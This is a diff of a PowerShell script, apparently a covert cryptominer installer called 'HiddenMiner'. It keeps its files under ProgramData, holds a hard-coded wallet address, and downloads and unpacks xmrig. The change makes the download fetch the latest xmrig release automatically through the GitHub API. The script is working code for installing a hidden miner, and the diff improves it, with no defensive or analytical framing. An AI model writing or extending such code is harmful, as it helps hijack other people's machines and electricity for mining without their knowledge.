@@ -8,7 +8,6 @@ $LOG_FILE = "$env:ProgramData\HiddenMiner\miner.log"
 $INSTALL_LOCK = "$env:ProgramData\HiddenMiner\.installed"
 $STATUS_FILE = "$env:ProgramData\HiddenMiner\status.json"
 $WALLET = "45BAUhBB2BkXKKsx1xsS2zXgxbEAusmWpVEeswcKJjqvYWav5YAgc2zRvjTnfAzZF19eBQJwM2cPHM2Y3CTekxoCGjocMDg"
-$MINER_URL = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-win64-msvc.zip"
 $MINER_DIR = "$env:ProgramData\HiddenMiner"
 $MINER_EXE = "$MINER_DIR\xmrig.exe"
 
@@ -39,7 +38,9 @@ function Ensure-Miner {
     if (Test-Path $MINER_EXE) { return }
     New-Item -ItemType Directory -Path $MINER_DIR -Force | Out-Null
     $zip = "$env:TEMP\xmrig.zip"
-    Invoke-WebRequest -Uri $MINER_URL -OutFile $zip -UseBasicParsing
+    $release = Invoke-WebRequest -Uri "https://api.github.com/repos/xmrig/xmrig/releases/latest" -UseBasicParsing | ConvertFrom-Json
+    $downloadUrl = ($release.assets | Where-Object { $_.name -like "*win64-msvc*" }).browser_download_url
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $zip -UseBasicParsing
     Expand-Archive -Path $zip -DestinationPath "$env:TEMP\xmrig" -Force
     $found = Get-ChildItem -Path "$env:TEMP\xmrig" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
     if ($found) { Copy-Item $found.FullName $MINER_EXE -Force }
